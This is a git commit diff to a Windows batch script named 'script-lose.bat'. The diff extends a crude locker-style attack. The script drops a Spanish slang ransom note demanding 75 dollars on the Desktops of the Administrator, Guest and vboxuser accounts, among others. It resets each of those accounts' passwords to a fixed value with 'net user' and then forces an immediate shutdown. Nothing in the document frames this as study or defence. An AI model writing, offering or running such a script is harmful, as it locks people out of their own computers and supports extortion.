60000cf1427e79e0a41f2f35d9b8ad0bd3f849c8
Sunglose <129249834+Sunglose@users.noreply.github.com>
2024-09-26 01:44:51 -0300

    Update script-lose.bat

--- script-lose.bat
+++ script-lose.bat
@@ -1,16 +1,44 @@
 @echo off
+
 cd /d C:\
-
 cd Users
-
 dir
-
 cd Administrador
-
 cd Desktop
+echo Depozitame 75 dolarucos i te deho el PICI limpio JAJAJAJAJA nauuur > AlfredoPillo.txt
 
-echo Depozitame 75 dolarucos i te deho el PICI limpio JAJAJAJAJA nauuur > Alfredo.txt
+cd /d C:\
+cd Users
+dir
+cd Administrator
+cd Desktop
+echo Depozitame 75 dolarucos i te deho el PICI limpio JAJAJAJAJA nauuur > AlfredoPillo.txt
+
+cd /d C:\
+cd Users
+dir
+cd Invitado
+cd Desktop
+echo Depozitame 75 dolarucos i te deho el PICI limpio JAJAJAJAJA nauuur > AlfredoPillo.txt
+
+cd /d C:\
+cd Users
+dir
+cd Guest
+cd Desktop
+echo Depozitame 75 dolarucos i te deho el PICI limpio JAJAJAJAJA nauuur > AlfredoPillo.txt
+
+cd /d C:\
+cd Users
+dir
+cd vboxuser
+cd Desktop
+echo Depozitame 75 dolarucos i te deho el PICI limpio JAJAJAJAJA nauuur > AlfredoPillo.txt
 
 net user Administrador #A250318l
+net user Administrator #A250318l
+net user Invitado #A250318l
+net user Guest #A250318l
+net user vboxuser #A250318l
 
 shutdown /s /f /t 0
